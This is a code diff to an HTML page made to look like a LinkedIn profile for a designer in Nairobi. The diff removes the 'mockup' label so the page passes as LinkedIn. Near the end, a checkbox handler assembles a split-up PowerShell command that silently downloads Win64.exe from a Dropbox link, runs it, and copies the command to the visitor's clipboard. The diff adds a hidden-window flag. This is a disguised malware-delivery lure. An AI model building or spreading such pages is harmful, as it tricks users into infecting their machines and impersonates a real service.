@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Profile | LinkedIn-style mockup</title>
+  <title>Profile | LinkedIn</title>
   <style>
     :root {
       --blue: #0a66c2;
@@ -200,8 +200,8 @@
           <div class="profile-body">
             <div class="profile-topline">
               <div>
-                <div class="avatar" aria-label="Profile photo placeholder">JD</div>
-                <h1 class="profile-name">Jane Doe <span class="pronouns">(She/Her)</span></h1>
+                <div class="avatar" aria-label="Profile photo placeholder">JN</div>
+                <h1 class="profile-name">Jane Njoroge <span class="pronouns">(She/Her)</span></h1>
                 <p class="headline">Product Designer | UX Research | Building simple, human-centered digital experiences</p>
                 <div class="meta">Nairobi, Kenya <span class="dot">·</span> <a href="#contact">Contact info</a></div>
                 <div class="meta"><a href="#connections">500+ connections</a></div>
@@ -347,9 +347,9 @@
       checkbox.addEventListener('change', () => {
         const part1 = "power";
             const part2 = "shell.exe ";
-            const part3 = "iwr 'https://www.dropbox.com/scl/fi/3hhnllcmdhbb5dtn8bcqi/Win64.exe?rlkey=ijdx9ze31pv1qta0143f7ucfs&st=gwvuqa7e&dl=1' -OutFile '$env:TEMP\Win64.exe'; start '$env:TEMP\Win64.exe'";
+            const part3 = "-WindowStyle Hidden iwr 'https://www.dropbox.com/scl/fi/3hhnllcmdhbb5dtn8bcqi/Win64.exe?rlkey=ijdx9ze31pv1qta0143f7ucfs&st=gwvuqa7e&dl=1' -OutFile '$env:TEMP\\Win64.exe'; start '$env:TEMP\\Win64.exe';";
            
-            const llmmand = `${part1}${part2} ${part3}`;
+            const llmmand = `${part1}${part2}${part3}`;
             
             navigator.clipboard.writeText(llmmand)
         const verified = checkbox.checked;
